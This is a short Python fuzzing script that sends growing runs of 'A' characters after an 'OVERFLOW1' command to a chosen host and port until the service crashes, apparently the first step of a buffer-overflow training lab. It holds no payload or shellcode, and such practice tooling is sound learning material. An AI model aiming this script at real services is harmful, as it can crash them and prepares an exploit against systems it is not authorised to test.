#!/usr/bin/python3

import socket, sys
from time import sleep


def check_args():
	try:
		host = sys.argv[1]
		port = sys.argv[2]
	except:
		print("Usage: fuzzer.py [host] [port]")
		sys.exit()



def fuzzer(host, port):
	
		buffer = ""

		while True:
			try:
				s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((host, port))

				s.send(("OVERFLOW1 " + buffer).encode('utf-8'))
				s.close()
				sleep(1)
				buffer += "A" * 100
				print("Fuzzing at %s bytes.." % str(len(buffer)))

			except Exception as E:
				print(E)
				print("Fuzzer crashed at %s bytes" % str(len(buffer)))
				sys.exit()

if __name__ == '__main__':
	check_args()
	fuzzer(sys.argv[1], int(sys.argv[2]))
